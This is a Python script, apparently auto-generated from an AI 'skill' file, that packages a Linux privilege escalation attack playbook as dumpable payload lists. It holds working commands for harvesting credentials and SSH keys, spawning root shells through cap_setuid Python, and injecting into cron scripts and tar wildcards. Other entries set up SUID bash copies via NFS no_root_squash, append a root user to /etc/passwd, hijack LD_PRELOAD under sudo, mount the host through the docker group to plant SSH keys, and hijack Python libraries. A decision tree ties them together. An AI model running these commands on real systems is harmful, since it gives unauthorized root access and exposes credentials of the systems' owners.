#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/linux-privilege-escalation

Skill: SKILL: Linux Privilege Escalation — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-linux-privilege-escalation.py --help
      python hack-skills-linux-privilege-escalation.py --list
      python hack-skills-linux-privilege-escalation.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/linux-privilege-escalation'
TITLE = 'SKILL: Linux Privilege Escalation — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: linux-privilege-escalation", "description: >-", "Linux privilege escalation playbook. Use when you have low-privilege shell access and need to escalate to root via SUID/SGID binaries, capabilities, cron abuse, kernel exploits, misconfigurations, or credential harvesting on Linux systems."],
    'skill-linux-privilege-escalation-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [container-escape-techniques](../container-escape-techniques/SKILL.md) when the target is a container and you need to escape to host", "- [linux-security-bypass](../linux-security-bypass/SKILL.md) when facing restricted shells, AppArmor, SELinux, or seccomp", "- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) after obtaining root for pivoting to adjacent hosts", "- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) when the host is a Kubernetes node"],
    'advanced-reference': ["Also load [SUID_CAPABILITIES_TRICKS.md](./SUID_CAPABILITIES_TRICKS.md) when you need:", "- Top 30 SUID binaries with exact exploitation commands (GTFOBins)", "- Capability-specific exploitation for each dangerous cap", "- Custom SUID binary exploitation methodology", "Also load [KERNEL_EXPLOITS_CHECKLIST.md](./KERNEL_EXPLOITS_CHECKLIST.md) when you need:", "- Kernel version \u2192 exploit mapping table (DirtyPipe, DirtyCow, OverlayFS, etc.)", "- Exploit compilation tips and cross-compilation notes", "- Kernel exploit stability assessment"],
    '1-enumeration-checklist': ["Run these immediately after landing a shell:"],
    'system-info': ["```bash", "uname -a                        # Kernel version", "cat /etc/os-release             # Distro and version", "cat /proc/version               # Kernel compile info", "hostname && id && whoami        # Current context"],
    'sudo-suid-sgid': ["```bash", "sudo -l                         # What can we run as root?", "find / -perm -4000 -type f 2>/dev/null   # SUID binaries", "find / -perm -2000 -type f 2>/dev/null   # SGID binaries", "getcap -r / 2>/dev/null         # Files with capabilities"],
    'cron-timers': ["```bash", "cat /etc/crontab", "ls -la /etc/cron.*", "crontab -l", "systemctl list-timers --all     # systemd timers"],
    'writable-files-dirs': ["```bash", "find / -writable -type f 2>/dev/null | grep -v proc", "ls -la /etc/passwd /etc/shadow  # Check permissions", "find / -perm -o+w -type d 2>/dev/null   # World-writable dirs"],
    'network-services': ["```bash", "ss -tlnp                        # Listening services", "cat /proc/net/tcp               # Raw TCP connections", "ps aux                          # Running processes", "env                             # Environment variables (credentials?)"],
    'credential-locations': ["```bash", "cat ~/.bash_history", "cat ~/.mysql_history", "find / -name \"*.conf\" -o -name \"*.cfg\" -o -name \"*.ini\" 2>/dev/null | head -30", "find / -name \"id_rsa\" -o -name \"*.pem\" -o -name \"*.key\" 2>/dev/null"],
    '2-suid-sgid-exploitation': [],
    'gtfobins-methodology': ["1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`", "2. Cross-reference each with [GTFOBins](https://gtfobins.github.io/)", "3. Use the \"SUID\" section specifically \u2014 not all binary abuse works with SUID"],
    'quick-win-suid-escalations': [],
    'shared-library-hijacking-suid-binary': ["```bash", "ldd /usr/local/bin/suid_binary                    # Check loaded libraries", "strace /usr/local/bin/suid_binary 2>&1 | grep -i \"open.*\\.so\"  # Find load paths"],
    'if-it-loads-from-a-writable-directory-inject-constructor': ["gcc -shared -fPIC -o /writable/path/libevil.so evil.c"],
    'evil-c-attribute-constructor-setuid-0-system-bin-bash-p': [],
    '3-capabilities-abuse': ["```bash"],
    'find-binaries-with-capabilities': ["getcap -r / 2>/dev/null"],
    'example-python3-with-cap-setuid': [],
    'usr-bin-python3-cap-setuid-ep': ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"],
    '4-cron-timer-abuse': [],
    'writable-cron-scripts': ["```bash"],
    'find-cron-jobs-running-as-root': ["cat /etc/crontab | grep root", "ls -la /etc/cron.d/"],
    'if-a-root-owned-cron-runs-a-script-writable-by-current-user': ["echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /writable/script.sh"],
    'wait-for-cron-tmp-bash-p': [],
    'path-hijacking-in-cron': ["```bash"],
    'if-crontab-has-path-home-user-usr-local-bin-usr-bin': [],
    'and-runs-root-backup-sh-without-full-path': [],
    'create-home-user-backup-sh': ["echo '#!/bin/bash' > /home/user/backup.sh", "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh", "chmod +x /home/user/backup.sh"],
    'wildcard-injection-tar': ["```bash"],
    'if-cron-runs-tar-czf-backup-archive-tar-gz': [],
    'in-the-target-directory-create': ["echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh", "echo \"\" > \"--checkpoint-action=exec=sh shell.sh\"", "echo \"\" > \"--checkpoint=1\""],
    'tar-interprets-filenames-as-arguments': [],
    'pspy-monitor-processes-without-root': ["```bash"],
    'upload-pspy64-or-pspy32-to-target': ["./pspy64"],
    'watch-for-cron-jobs-services-and-background-processes': [],
    '5-nfs-no-root-squash': ["```bash"],
    'on-attacker-check-exported-shares': ["showmount -e TARGET_IP"],
    'if-no-root-squash-is-set': ["mount -t nfs TARGET_IP:/share /mnt/nfs"],
    'as-root-on-attacker-box': ["cp /bin/bash /mnt/nfs/bash", "chmod +s /mnt/nfs/bash"],
    'on-target': ["/share/bash -p    # root shell"],
    '6-writable-etc-passwd-or-etc-shadow': [],
    'writable-etc-passwd': ["```bash"],
    'generate-password-hash': ["openssl passwd -1 -salt xyz password123"],
    '1-xyz-hash': [],
    'append-root-equivalent-user': ["echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd"],
    'or-replace-root-s-x-with-generated-hash-if-no-shadow-file': [],
    'writable-etc-shadow': ["```bash"],
    'generate-sha-512-hash': ["mkpasswd -m sha-512 password123"],
    'replace-root-s-hash-in-etc-shadow': [],
    '7-ld-preload-ld-library-path-with-sudo': ["```bash"],
    'if-sudo-l-shows-env-keep-ld-preload-or-env-keep-ld-library-path': [],
    'compile-so-with-init-that-calls-setresuid-0-0-0-system-bin-bash-p': ["gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c", "sudo LD_PRELOAD=/tmp/pe.so /usr/bin/some_allowed_binary"],
    '8-docker-group-root': ["```bash"],
    'if-current-user-is-in-the-docker-group': ["id    # check for \"docker\" in groups"],
    'mount-host-filesystem': ["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
    'or-add-ssh-key': ["docker run -v /root:/mnt --rm -it alpine sh -c \\", "'echo \"ssh-rsa AAAA...\" >> /mnt/.ssh/authorized_keys'"],
    '9-python-perl-ruby-library-hijacking': ["```bash"],
    'python-if-a-root-executed-script-does-import-somelib': [],
    'check-python-path-order': ["python3 -c 'import sys; print(\"\\n\".join(sys.path))'"],
    'place-malicious-module-in-writable-path-that-comes-first': ["cat > /writable/path/somelib.py << 'EOF'", "import os", "os.system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash\")"],
    'perl-perl5lib-inc-manipulation': [],
    'ruby-rubylib-load-path-manipulation': [],
    '10-automated-tools': [],
    '11-privilege-escalation-decision-tree': ["Low-privilege shell obtained", "\u251c\u2500\u2500 sudo -l shows entries?", "\u2502   \u251c\u2500\u2500 GTFOBins match? \u2192 exploit directly", "\u2502   \u251c\u2500\u2500 env_keep has LD_PRELOAD? \u2192 LD_PRELOAD hijack (\u00a77)", "\u2502   \u251c\u2500\u2500 NOPASSWD on custom script? \u2192 review script for injection", "\u2502   \u2514\u2500\u2500 (ALL) with password? \u2192 check for password reuse/hashes", "\u251c\u2500\u2500 SUID/SGID binaries found?", "\u2502   \u251c\u2500\u2500 Standard binary on GTFOBins? \u2192 SUID exploit (\u00a72)", "\u2502   \u251c\u2500\u2500 Custom binary? \u2192 reverse engineer, check libs (strace/ltrace)", "\u2502   \u2514\u2500\u2500 Shared lib from writable path? \u2192 library hijack (\u00a72)", "\u251c\u2500\u2500 Capabilities on binaries?", "\u2502   \u251c\u2500\u2500 cap_setuid? \u2192 instant root (\u00a73)", "\u2502   \u251c\u2500\u2500 cap_dac_override? \u2192 write /etc/passwd (\u00a76)", "\u2502   \u251c\u2500\u2500 cap_sys_admin? \u2192 mount / namespace tricks", "\u2502   \u2514\u2500\u2500 cap_sys_ptrace? \u2192 process injection", "\u251c\u2500\u2500 Cron jobs running as root?", "\u2502   \u251c\u2500\u2500 Writable script? \u2192 inject payload (\u00a74)", "\u2502   \u251c\u2500\u2500 Missing full path? \u2192 PATH hijack (\u00a74)", "\u2502   \u2514\u2500\u2500 Uses wildcards? \u2192 wildcard injection (\u00a74)", "\u251c\u2500\u2500 Writable sensitive files?", "\u2502   \u251c\u2500\u2500 /etc/passwd writable? \u2192 add root user (\u00a76)", "\u2502   \u251c\u2500\u2500 /etc/shadow writable? \u2192 replace root hash (\u00a76)", "\u2502   \u2514\u2500\u2500 systemd unit files writable? \u2192 add ExecStartPre", "\u251c\u2500\u2500 Docker/LXD group membership?", "\u2502   \u2514\u2500\u2500 Yes \u2192 mount host filesystem (\u00a78)", "\u251c\u2500\u2500 NFS shares with no_root_squash?", "\u2502   \u2514\u2500\u2500 Yes \u2192 SUID binary via NFS (\u00a75)", "\u251c\u2500\u2500 Kernel version old/unpatched?", "\u2502   \u2514\u2500\u2500 Check KERNEL_EXPLOITS_CHECKLIST.md", "\u2514\u2500\u2500 None of the above?", "\u251c\u2500\u2500 Run LinPEAS for comprehensive scan", "\u251c\u2500\u2500 Check for password reuse (bash_history, config files)", "\u251c\u2500\u2500 Check internal services (127.0.0.1 listeners)", "\u2514\u2500\u2500 Monitor processes with pspy for hidden opportunities"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()